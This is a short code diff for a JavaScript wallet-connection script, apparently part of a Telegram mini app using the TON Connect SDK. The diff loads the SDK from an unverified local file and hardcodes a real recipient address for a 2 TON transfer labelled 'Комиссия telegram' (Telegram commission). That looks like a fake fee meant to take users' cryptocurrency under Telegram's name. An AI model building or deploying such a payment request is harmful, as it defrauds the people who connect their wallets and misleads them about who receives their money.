@@ -5,7 +5,7 @@ tg.expand();
 async function loadTonConnect() {
     return new Promise((resolve, reject) => {
         const script = document.createElement("script");
-        script.src = "https://cdn.jsdelivr.net/npm/@tonconnect/sdk@latest";
+        script.src = "tonconnect-sdk.min.js"; // Используем локальный SDK
         script.onload = () => {
             console.log("✅ TON Connect SDK загружен!");
             resolve();
@@ -18,7 +18,7 @@ async function loadTonConnect() {
     });
 }
 
-// === Функция подключения кошелька TON ===
+// === Функция подключения кошелька и отправки TON ===
 async function connectWallet() {
     try {
         await loadTonConnect();
@@ -46,7 +46,7 @@ async function connectWallet() {
 
         // === Создаем транзакцию на 2 TON ===
         const transaction = {
-            to: "EQC3DQ...ЗАМЕНИТЕ_НА_АДРЕС", // Адрес получателя
+            to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc", // Адрес получателя
             value: "2000000000", // 2 TON (в нанотонах)
             payload: "Комиссия telegram"
         };
